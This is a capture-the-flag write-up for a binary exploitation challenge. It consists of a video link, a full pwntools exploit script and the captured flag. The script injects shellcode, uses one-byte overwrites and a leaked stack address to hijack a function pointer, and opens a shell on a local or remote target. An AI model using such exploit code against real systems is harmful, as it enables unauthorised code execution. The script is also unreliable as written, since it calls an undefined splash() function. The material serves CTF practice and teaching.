*No written writeup available*

Look here for video writeup: https://www.youtube.com/watch?v=a8wWPVTVuXo

Full exploit script:
```py

from pwn import *
import sys, time

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)


context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(BINARY, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb()

    	REMOTE = False
    else:
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

global sh

def read():
    sh.sendlineafter('exit\n', '0')

def write(s):
	sh.sendlineafter('exit\n', '1')
	# for some reason i have to do this??
	time.sleep(0.1)
	sh.sendline(s)

def flip(c):
    sh.sendlineafter('exit\n', '2')
    sh.sendlineafter(')?', c)

# Cool!
splash()

# Connect to local/remote process
sh = connect()

write(asm(shellcraft.amd64.linux.sh(), arch='amd64', os='linux'))

# exploit one byte overwrite to point to malicious read addr (to leak stack addr)
for i in range(6):
	flip('f')

# guess (works 1/16 of the time)
write(b'A' * 160 + b'\x37')

# reset rbx to a good location to get rbx at read_page
write(b'A'*159)

# leak stack addr of read_page
read()
leak = sh.recvline()[:6]
diary_addr = int.from_bytes(leak, byteorder='little') - 7
print(hex(diary_addr))

# exploit one byte again but this time with stack addr
write(b'A' * 160 + b'\xd7')

# reset rbx to good loc (so that we only do one more word overwrite)
write(b'A'*7)

# exploit more overwrite 
read()
time.sleep(0.1)
sh.sendline(b'A'*152 + p64(diary_addr + 160 * 3))

# now read_page is at shellcode so we just call it for shell
read()

# Open shell
sh.interactive()
```

Flag: `gnsCTF{st4ck_pr0t_c4nt_st0p_th1s_r0p}`
